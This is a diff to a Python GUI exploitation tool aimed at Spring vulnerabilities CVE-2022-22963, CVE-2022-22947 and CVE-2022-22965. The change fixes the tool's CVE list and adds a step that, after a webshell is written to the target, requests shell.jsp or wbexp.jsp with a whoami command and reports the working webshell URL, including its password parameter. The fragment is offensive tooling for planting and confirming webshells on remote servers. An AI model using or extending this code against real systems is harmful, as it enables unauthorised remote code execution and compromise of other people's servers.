@@ -52,7 +52,7 @@ class RootFrom:
       "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
       "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
       "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00")
-        cves = ("22965-aabyss-linux-post","CVE-2022-22963","CVE-2022-22947",,"CVE-2022-22965","22965-13exp-shell","22965-aabyss-win-post","22965-aabyss-shell-get")
+        cves = ("22965-aabyss-linux-post","CVE-2022-22963","CVE-2022-22947","22965-13exp-shell","CVE-2022-22965","22965-aabyss-win-post","22965-aabyss-shell-get")
         no_proxies = []
         proxy_list = []
         self.root = tk.Tk()
@@ -838,12 +838,20 @@ class RootFrom:
                     back = "[+]Wirte Shell Response Code: %d" % ret.status_code
                     self.info_text.insert(tk.INSERT,back)
                     self.info_text.insert(tk.INSERT, '\n')
-                if Vule == "CVE-2022-22965":
+                if filename == "shell":
+                    test = requests.get(url + filename +".jsp?whoami")
+                elif filename == "wbexp":
+                    test = requests.get(url + filename +".jsp")
+                if Vule == "CVE-2022-22965" and ('root' in str(test.text)):
                     back = "[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "shell.jsp?cmd=whoami"
                     self.info_text.insert(tk.INSERT,back)
                     self.info_text.insert(tk.INSERT, '\n')
-                elif Vule == "22965-13exp-shell":
+                elif Vule == "22965-13exp-shell" and ('13exp' in str(test.text)):
                     back = "[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "wbexp.jsp?pwd=13exp&cmd=whoami"
+                    self.info_text.insert(tk.INSERT,back)
+                    self.info_text.insert(tk.INSERT, '\n')
+                else:
+                    back = "[-] CVE-2022-22965漏洞不存在"
                     self.info_text.insert(tk.INSERT,back)
                     self.info_text.insert(tk.INSERT, '\n')
             else:
